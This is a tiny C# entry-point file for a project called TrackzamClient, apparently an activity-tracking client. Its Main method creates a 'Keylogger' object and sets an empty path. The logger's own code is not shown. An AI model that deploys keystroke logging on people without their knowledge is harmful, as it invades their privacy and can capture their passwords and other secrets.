using System;

namespace TrackzamClient
{
    class Program
    {
        static void Main(string[] args)
        {
            // TODO delete later (for checking the .Net version)
            //Console.WriteLine(RuntimeInformation.FrameworkDescription);
            Keylogger k = new Keylogger();
            k.setPath(@"");
        }
    }
}
